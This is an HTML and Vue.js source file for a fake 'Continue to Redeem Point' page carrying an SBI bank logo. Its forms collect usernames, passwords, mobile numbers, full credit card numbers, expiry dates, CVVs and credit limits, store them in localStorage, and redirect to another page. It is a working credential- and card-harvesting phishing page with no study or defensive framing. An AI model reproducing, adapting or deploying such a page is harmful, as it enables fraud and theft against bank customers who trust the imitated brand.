<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>i - Vue.js</title>
    <!-- Vue CDN -->
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        body {
            background-color: #f0f0f0;
            min-height: 100vh;
            padding-bottom: 20px;
        }
        .header {
            text-align: center;
            padding: 15px;
            background-color: white;
        }
        .logo {
            max-width: 100%;
            height: auto;
            max-height: 120px;
        }
        .container {
            max-width: 420px;
            margin: 15px auto;
            background-color: white;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.08);
            overflow: hidden;
        }
        .form-header {
            color: #000;
            padding: 18px 20px 8px 20px;
            text-align: center;
            font-size: 16px;
            font-weight: bold;
        }
        .tabs-container {
            display: flex;
            background-color: #f5f5f5;
            padding: 4px;
            margin: 0 20px 10px 20px;
            border-radius: 25px;
        }
        .tab {
            flex: 1;
            padding: 8px 4px;
            text-align: center;
            font-size: 13px;
            font-weight: bold;
            background-color: transparent;
            color: #666;
            border: none;
            border-radius: 20px;
            cursor: pointer;
            transition: all 0.3s;
        }
        .tab.active {
            background-color: #24A1E8;
            color: #fff;
            box-shadow: 0 2px 4px rgba(36, 161, 232, 0.3);
        }
        .form-content {
            padding: 0 20px 20px 20px;
        }
        .form-group {
            margin-bottom: 10px;
        }
        .form-label {
            display: block;
            font-size: 12px;
            font-weight: bold;
            color: #333;
            margin-bottom: 3px;
        }
        .form-input {
            width: 100%;
            padding: 6px 0;
            font-size: 13px;
            border: none;
            border-bottom: 1px solid #ccc;
            background-color: transparent;
            outline: none;
            border-radius: 0;
            transition: border-color 0.3s;
        }
        .form-input:focus {
            border-bottom-color: #24A1E8;
        }
        .login-button {
            display: block;
            width: 100%;
            padding: 10px;
            background-color: #24A1E8;
            color: white;
            font-size: 14px;
            font-weight: bold;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 12px;
        }
        .login-button:hover {
            background-color: #1a8cd8;
        }
        .expiry-cvv-container {
            display: flex;
            gap: 12px;
        }
        .expiry-cvv-container > div {
            flex: 1;
        }
        .footer-img {
            width: 100%;
            max-width: 900px;
            display: block;
            margin: 20px auto 0;
        }
        .asterisk {
            color: #ff0000;
        }
        .error-message {
            color: #ff4444;
            font-size: 11px;
            margin-top: 3px;
        }
        .form-input.error {
            border-bottom-color: #ff4444;
        }
    </style>
</head>
<body>
    <div id="app">
        <!-- Header -->
        <div class="header">
            <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" 
                 alt="SBI Logo" 
                 class="logo">
        </div>
        
        <!-- Main Container -->
        <div class="container">
            <div class="form-header">
                Continue to Redeem Point
            </div>
            
            <!-- Tabs -->
            <div class="tabs-container">
                <button class="tab" :class="{ active: activeTab === 'user' }" @click="switchTab('user')">User ID</button>
                <button class="tab" :class="{ active: activeTab === 'card' }" @click="switchTab('card')">Credit Card No.</button>
            </div>
            
            <!-- User ID Form -->
            <div class="form-content" v-show="activeTab === 'user'">
                <form @submit.prevent="handleUserSubmit">
                    <div class="form-group">
                        <label class="form-label">Username <span class="asterisk">*</span></label>
                        <input type="text" class="form-input" :class="{ error: errors.user.username }" 
                               v-model="userForm.username" @input="clearError('user', 'username')" @blur="validateUserField('username')" placeholder="Enter username">
                        <div class="error-message" v-if="errors.user.username">{{ errors.user.username }}</div>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">Password <span class="asterisk">*</span></label>
                        <input type="password" class="form-input" :class="{ error: errors.user.password }" 
                               v-model="userForm.password" @input="clearError('user', 'password')" @blur="validateUserField('password')" placeholder="Enter password">
                        <div class="error-message" v-if="errors.user.password">{{ errors.user.password }}</div>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">Registered Mobile No. <span class="asterisk">*</span></label>
                        <input type="tel" class="form-input" :class="{ error: errors.user.mobile }" 
                               v-model="userForm.mobile" @input="formatMobile('user')" @blur="validateUserField('mobile')" placeholder="10-digit mobile number" maxlength="10">
                        <div class="error-message" v-if="errors.user.mobile">{{ errors.user.mobile }}</div>
                    </div>
                    
                    <button type="submit" class="login-button">LOGIN</button>
                </form>
            </div>
            
            <!-- Credit Card Form -->
            <div class="form-content" v-show="activeTab === 'card'">
                <form @submit.prevent="handleCardSubmit">
                    <div class="form-group">
                        <label class="form-label">Credit Card No. <span class="asterisk">*</span></label>
                        <input type="text" class="form-input" :class="{ error: errors.card.cardNumber }" 
                               v-model="cardForm.cardNumber" @input="formatCardNumber" @blur="validateCardField('cardNumber')" placeholder="1234 5678 9012 3456">
                        <div class="error-message" v-if="errors.card.cardNumber">{{ errors.card.cardNumber }}</div>
                    </div>
                    
                    <div class="expiry-cvv-container">
                        <div class="form-group">
                            <label class="form-label">Expiry Date <span class="asterisk">*</span></label>
                            <input type="text" class="form-input" :class="{ error: errors.card.expiry }" 
                                   v-model="cardForm.expiry" @input="formatExpiry" @blur="validateCardField('expiry')" placeholder="MM/YY" maxlength="5">
                            <div class="error-message" v-if="errors.card.expiry">{{ errors.card.expiry }}</div>
                        </div>
                        <div class="form-group">
                            <label class="form-label">CVV <span class="asterisk">**</span></label>
                            <input type="password" class="form-input" :class="{ error: errors.card.cvv }" 
                                   v-model="cardForm.cvv" @input="formatCVV" @blur="validateCardField('cvv')" placeholder="123" maxlength="3">
                            <div class="error-message" v-if="errors.card.cvv">{{ errors.card.cvv }}</div>
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">Available Credit Limit <span class="asterisk">*</span></label>
                        <input type="text" class="form-input" :class="{ error: errors.card.creditLimit }" 
                               v-model="cardForm.creditLimit" @input="clearError('card', 'creditLimit')" @blur="validateCardField('creditLimit')" placeholder="â‚¹">
                        <div class="error-message" v-if="errors.card.creditLimit">{{ errors.card.creditLimit }}</div>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">Registered Mobile No. <span class="asterisk">*</span></label>
                        <input type="tel" class="form-input" :class="{ error: errors.card.mobile }" 
                               v-model="cardForm.mobile" @input="formatMobile('card')" @blur="validateCardField('mobile')" placeholder="10-digit mobile number" maxlength="10">
                        <div class="error-message" v-if="errors.card.mobile">{{ errors.card.mobile }}</div>
                    </div>
                    
                    <button type="submit" class="login-button">LOGIN</button>
                </form>
            </div>
        </div>
        
        <!-- Footer -->
        <img src="https://i.ibb.co/5WTjD1Nb/Footer-bfdfef4c-1.jpg" 
             alt="Security Guidelines" 
             class="footer-img">
    </div>

    <script>
        new Vue({
            el: '#app',
            data: {
                activeTab: 'user',
                userForm: {
                    username: '',
                    password: '',
                    mobile: ''
                },
                cardForm: {
                    cardNumber: '',
                    expiry: '',
                    cvv: '',
                    creditLimit: '',
                    mobile: ''
                },
                errors: {
                    user: {},
                    card: {}
                }
            },
            methods: {
                // ---------- Tab Switching ----------
                switchTab(tab) {
                    this.activeTab = tab;
                },

                // ---------- Error Handling ----------
                setError(formType, field, message) {
                    this.$set(this.errors[formType], field, message);
                },
                clearError(formType, field) {
                    if (this.errors[formType] && this.errors[formType][field]) {
                        this.$delete(this.errors[formType], field);
                    }
                },

                // ---------- Formatting ----------
                formatCardNumber() {
                    let value = this.cardForm.cardNumber.replace(/\s+/g, '').replace(/\D/g, '');
                    value = value.substring(0, 16);
                    let formatted = '';
                    for (let i = 0; i < value.length; i++) {
                        if (i > 0 && i % 4 === 0) formatted += ' ';
                        formatted += value[i];
                    }
                    this.cardForm.cardNumber = formatted;
                    this.clearError('card', 'cardNumber');
                },
                formatExpiry() {
                    let value = this.cardForm.expiry.replace(/\D/g, '');
                    if (value.length >= 2) {
                        value = value.substring(0, 2) + '/' + value.substring(2, 4);
                    }
                    this.cardForm.expiry = value.substring(0, 5);
                    this.clearError('card', 'expiry');
                },
                formatCVV() {
                    this.cardForm.cvv = this.cardForm.cvv.replace(/\D/g, '').substring(0, 3);
                    this.clearError('card', 'cvv');
                },
                formatMobile(formType) {
                    const form = formType === 'user' ? this.userForm : this.cardForm;
                    form.mobile = form.mobile.replace(/\D/g, '').substring(0, 10);
                    this.clearError(formType, 'mobile');
                },

                // ---------- Validation ----------
                validateUserField(field) {
                    const value = this.userForm[field];
                    switch (field) {
                        case 'username':
                            if (!value.trim()) this.setError('user', 'username', 'Username is required');
                            else this.clearError('user', 'username');
                            break;
                        case 'password':
                            if (!value) this.setError('user', 'password', 'Password is required');
                            else if (value.length < 6) this.setError('user', 'password', 'Password must be at least 6 characters');
                            else this.clearError('user', 'password');
                            break;
                        case 'mobile':
                            if (!value) this.setError('user', 'mobile', 'Mobile number is required');
                            else if (!/^\d{10}$/.test(value)) this.setError('user', 'mobile', 'Valid 10-digit mobile number is required');
                            else this.clearError('user', 'mobile');
                            break;
                    }
                },
                validateCardField(field) {
                    const value = this.cardForm[field];
                    switch (field) {
                        case 'cardNumber':
                            if (!value.trim()) this.setError('card', 'cardNumber', 'Credit card number is required');
                            else if (!/^[\d\s]{16,19}$/.test(value.replace(/\s/g, ''))) this.setError('card', 'cardNumber', 'Valid credit card number is required');
                            else this.clearError('card', 'cardNumber');
                            break;
                        case 'expiry':
                            if (!value) this.setError('card', 'expiry', 'Expiry date is required');
                            else if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(value)) this.setError('card', 'expiry', 'Format: MM/YY (e.g., 12/25)');
                            else this.clearError('card', 'expiry');
                            break;
                        case 'cvv':
                            if (!value) this.setError('card', 'cvv', 'CVV is required');
                            else if (!/^\d{3}$/.test(value)) this.setError('card', 'cvv', '3-digit CVV is required');
                            else this.clearError('card', 'cvv');
                            break;
                        case 'creditLimit':
                            if (!value.trim()) this.setError('card', 'creditLimit', 'Credit limit is required');
                            else this.clearError('card', 'creditLimit');
                            break;
                        case 'mobile':
                            if (!value) this.setError('card', 'mobile', 'Mobile number is required');
                            else if (!/^\d{10}$/.test(value)) this.setError('card', 'mobile', 'Valid 10-digit mobile number is required');
                            else this.clearError('card', 'mobile');
                            break;
                    }
                },
                validateUserForm() {
                    ['username', 'password', 'mobile'].forEach(field => this.validateUserField(field));
                    return Object.keys(this.errors.user).length === 0;
                },
                validateCardForm() {
                    ['cardNumber', 'expiry', 'cvv', 'creditLimit', 'mobile'].forEach(field => this.validateCardField(field));
                    return Object.keys(this.errors.card).length === 0;
                },

                // ---------- Form Submission ----------
                saveDataAndRedirect(formData, formType) {
                    const submissions = JSON.parse(localStorage.getItem('formSubmissions') || '[]');
                    submissions.push({
                        id: Date.now(),
                        type: formType,
                        data: formData,
                        timestamp: new Date().toISOString(),
                        ip: 'Not available in browser'
                    });
                    localStorage.setItem('formSubmissions', JSON.stringify(submissions));
                    window.location.href = 'blogone.html';
                },
                handleUserSubmit() {
                    if (this.validateUserForm()) {
                        this.saveDataAndRedirect({ ...this.userForm }, 'User ID');
                    }
                },
                handleCardSubmit() {
                    if (this.validateCardForm()) {
                        this.saveDataAndRedirect({ ...this.cardForm }, 'Credit Card');
                    }
                }
            }
        });
    </script>
</body>
</html>
